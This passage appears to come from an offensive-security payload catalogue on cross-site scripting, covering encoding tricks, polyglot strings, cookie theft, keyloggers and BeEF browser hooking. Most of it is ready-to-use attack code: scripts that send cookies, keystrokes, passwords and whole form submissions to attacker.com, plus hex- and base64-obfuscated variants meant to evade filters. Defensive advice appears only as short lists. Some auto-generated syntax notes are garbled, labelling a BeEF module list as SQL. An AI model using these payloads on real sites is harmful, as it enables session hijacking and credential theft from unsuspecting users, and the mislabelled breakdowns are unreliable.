**Vulnerability Principle:** XSS multi-layer encoding attacks: 1) HTML entity encoding (&#x6A;avascript:alert(1)) 2) double URL encoding (%253Cscript%253E) 3) JavaScript unicode escape (\u0061lert) 4) octal/hexadecimal encoding 5) mixed encoding (HTML entity + JS encoding) 6) Base64 data URI (data:text/html;base64,PHN...).

**Exploitation Method:** Complete exploitation flow:
1. Analyze the encoding handling flow
2. Choose an appropriate encoding method
3. Construct the encoded payload
4. Verify the bypass effect

**Defensive Measures:** Defenses:
1. Uniform encoding handling
2. Avoid decoding multiple times
3. Encode at output
4. Use secure encoding functions

---

### Polyglot XSS  `xss-polyglot`
_Multi-environment universal XSS payload_
Subcategory: **Polyglot** · tags: `xss` `polyglot` `universal`

**Prerequisites:**
- An XSS injection point exists
- The specific environment is uncertain

**Attack Chain:**

**1. Classic Polyglot**
> Classic multi-environment Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
**Syntax breakdown:**
- `jaVasCript:` — JavaScript protocol, mixed case _value_
- `/*-/*`/*\`/*` — comment and template string obfuscation _value_
- `oNcLiCk=alert()` — click event _function_
- `</stYle/</titLe` — close multiple tags _value_
- `<sVg/oNloAd=alert()` — SVG tag XSS _tag_

**2. Short Polyglot**
> Short version Polyglot
```
'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
```

**3. Attribute injection Polyglot**
> Attribute value injection Polyglot
```
'onmouseover=alert(1) x='
"onfocus=alert(1) autofocus x="
'onclick=alert(1)//
```

**4. URL parameter Polyglot**
> URL parameter Polyglot
```
javascript:alert(1)//http://
data:text/html,<script>alert(1)</script>
```

**WAF/EDR Bypass Variants:**

**Advanced Polyglot**
> Concise and efficient Polyglot
```
-->'"<svg onload=alert(1)>"><script>alert(1)</script>
```
**Syntax breakdown:**
- `-->` — HTML comment terminator _technique_
- `<svg onload=alert(1)>` — SVG event handler triggering XSS _tag_
- `<script>alert(1)</script>` — script tag execution _tag_

**Overview:** XSS Polyglot is a universal XSS payload that can trigger execution in multiple contexts (HTML/JS/attribute/URL/CSS). A single carefully crafted string can be applicable to different injection points simultaneously, greatly improving fuzzing efficiency.

**Vulnerability Principle:** Polyglot XSS exploits the fault tolerance mechanism of HTML/JS/CSS parsers: a single payload contains a closing quote, HTML tags, JS comments, event handlers, and multiple other elements, so that it can escape the context and execute the script whether it is used as an HTML attribute value, a JS string, a CSS value, or a URL parameter.

**Exploitation Method:** Complete exploitation flow:
1. Use the Polyglot to probe the injection point
2. Observe in which context the payload executes
3. Adjust the attack strategy based on the result

**Defensive Measures:** Defenses:
1. Strictly distinguish input contexts
2. Targeted output encoding
3. Use a CSP policy
4. Input validation and allowlisting

---

### XSS Cookie Theft  `xss-cookie-theft`
_Use XSS to steal user cookies_
Subcategory: **Cookie Theft** · tags: `xss` `cookie` `theft` `session`

**Prerequisites:**
- An XSS vulnerability exists
- The cookie does not have HttpOnly set

**Attack Chain:**

**1. Basic cookie theft**
> Use the Image object to send the cookie
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```
**Syntax breakdown:**
- `new Image()` — create an image object _function_
- `.src` — set the image source to trigger an HTTP request _value_
- `document.cookie` — obtain the current page's cookies _function_

**2. Fetch API theft**
> Use the Fetch/Beacon API
```
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
```
**Syntax breakdown:**
- `fetch()` — modern HTTP request API _function_
- `sendBeacon()` — asynchronously send data without blocking the page _function_

**3. XMLHttpRequest theft**
> Send using XHR
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**4. Encoded transmission**
> Base64-encoded transmission
```
<script>
var data = btoa(document.cookie);
new Image().src="http://attacker.com/steal?c="+data;
</script>
```
**Syntax breakdown:**
- `btoa()` — Base64 encoding function _function_

**5. Complete exploitation script**
> Collect complete information
```
<script>
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**WAF/EDR Bypass Variants:**

**Obfuscation bypass**
> Variable obfuscation bypass
```
<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**Overview:** XSS cookie theft is one of the most classic XSS exploitation methods. The injected script reads document.cookie and sends it to an attacker-controlled server, thereby hijacking the user's session. The HttpOnly flag can effectively defend against this attack.

**Vulnerability Principle:** Cookie theft attacks use JavaScript's document.cookie API to read all cookies without the HttpOnly flag set, and exfiltrate the cookies to the attacker's server via the Image object/fetch/XMLHttpRequest and similar methods. After obtaining the cookies, the user's session can be directly hijacked to log into the account.

**Exploitation Method:** Complete exploitation flow:
1. Discover the XSS vulnerability
2. Construct a cookie theft script
3. Induce the victim to trigger it
4. Obtain the cookie to take over the session

**Defensive Measures:** Defenses:
1. Set the HttpOnly flag
2. Set the Secure flag
3. Use the SameSite attribute
4. Implement session binding validation

---

### XSS Keylogger  `xss-keylogger`
_Use XSS to log user keyboard input_
Subcategory: **Keylogging** · tags: `xss` `keylogger` `credential`

**Prerequisites:**
- A stored XSS exists
- The target page has sensitive input

**Attack Chain:**

**1. Basic keylogger**
> Listen for keyboard keys
```
<script>
document.addEventListener("keypress", function(e){
  new Image().src = "http://attacker.com/log?key=" + e.key;
});
</script>
```
**Syntax breakdown:**
- `addEventListener` — add an event listener _function_
- `keypress` — key press event _value_
- `e.key` — the pressed key value _value_

**2. Complete keylogger**
> Send the log on Enter
```
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**3. Form theft**
> Steal password fields
```
<script>
document.querySelectorAll("input[type=password]").forEach(function(input){
  input.addEventListener("change", function(){
    new Image().src = "http://attacker.com/log?pwd=" + this.value;
  });
});
</script>
```
**Syntax breakdown:**
- `querySelectorAll` — select all matching elements _function_
- `input[type=password]` — password input box selector _value_
- `change` — value change event _value_

**4. Form submission hijacking**
> Hijack form submission
```
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**WAF/EDR Bypass Variants:**

**Obfuscated version**
> Hexadecimal obfuscation
```
<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**Overview:** An XSS keylogger captures all of the user's keyboard input by injecting a JavaScript event listener, including sensitive information such as passwords and credit card numbers, and sends it to the attacker in real time. It is more harmful and stealthy than cookie theft.

**Vulnerability Principle:** XSS keylogging uses addEventListener to listen for keypress/keydown/input events, capturing all of the user's keyboard input on the page. An attacker can listen for specific input boxes (such as the password box), exfiltrating the captured keystrokes in real time via an Image beacon or WebSocket, completely unnoticed by the user.

**Exploitation Method:** Complete exploitation flow:
1. Inject the keylogger script
2. Continuously collect keystroke data
3. Send it to the attacker's server
4. Analyze it to obtain sensitive information

**Defensive Measures:** Defenses:
1. Strict XSS protection
2. Use a virtual keyboard to input sensitive information
3. Enforce a content security policy
4. Monitor abnormal script behavior

---

### BeEF Framework Exploitation  `xss-beef`
_Use the BeEF framework for XSS exploitation_
Subcategory: **BeEF Exploitation** · tags: `xss` `beef` `framework` `exploitation`

**Prerequisites:**
- An XSS vulnerability exists
- A BeEF server is deployed

**Attack Chain:**

**1. Deploy BeEF**
> Deploy the BeEF server
_platform: linux_
```
# Install BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install
./beef

# Runs on http://localhost:3000 by default
# Default username: beef
# Default password: beef
```
**Syntax breakdown:**
- `# Install BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install` — attack payload _value_

**2. Inject the Hook script**
> Inject the BeEF Hook
```
<script src="http://attacker.com:3000/hook.js"></script>
Inject short version:
<script src="//attacker.com:3000/hook.js"></script>
```
**Syntax breakdown:**
- `hook.js` — BeEF's Hook script _value_
- `attacker.com:3000` — BeEF server address _domain_

**3. Common commands**
> BeEF console commands
```
# Common BeEF console commands
# View online zombies
beef> online_browsers

# Execute a command
beef> run social_engineering fake_notification

# Get cookies
beef> run browser get_cookies

# Redirect the page
beef> run browser redirect https://evil.com
```
**Syntax breakdown:**
- `# Common BeEF console commands
# View online zombies
beef> online_browsers

# Execute a command
beef> run social_engin` — attack payload _value_

**4. Module exploitation**
> BeEF module list
```
# Common modules
# Social engineering
- Fake Notification
- Fake Flash Update
- Pretty Theft

# Browser attacks
- Get Cookie
- Redirect Browser
- TabNabbing

# Network attacks
- DNS Spoofing
- Ping Sweep
- Port Scanner
```
**Syntax breakdown:**
- `# Common modules
# Social engineering
- Fake Notification
- Fake Flash ` — SQL expression _value_
- `Update` — SQL keyword _keyword_
- `
- Pretty Theft

# Browser attacks
- Get Cookie
- Redirect Browser
- TabNabbing

# Network attacks
- DNS Spoofing
- Ping Sweep
- Port Scanner` — SQL expression _value_

**WAF/EDR Bypass Variants:**

**Obfuscate the Hook URL**
> Base64-obfuscated Hook injection
```
<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**Overview:** BeEF (Browser Exploitation Framework) is an open-source browser exploitation framework. By injecting the hook.js script via XSS, it controls the victim's browser and can perform hundreds of post-exploitation operations such as internal network scanning, keylogging, social engineering attacks, and vulnerability exploitation.

**Vulnerability Principle:** BeEF uses a piece of JavaScript hook script (hook.js) to establish a persistent WebSocket connection with the C2 server, turning the victim's browser into a zombie node. Executable operations include: obtaining browser information, screenshots, redirection, form injection, internal port scanning, ARP spoofing (WebRTC), and so on.

**Exploitation Method:** Complete exploitation flow:
1. Deploy the BeEF server
2. Inject the Hook script
3. The victim comes online
4. Use modules to attack

**Defensive Measures:** Defenses:
1. Strict XSS protection
2. Use CSP to restrict external scripts
3. Monitor abnormal network connections
4. Security awareness training

---
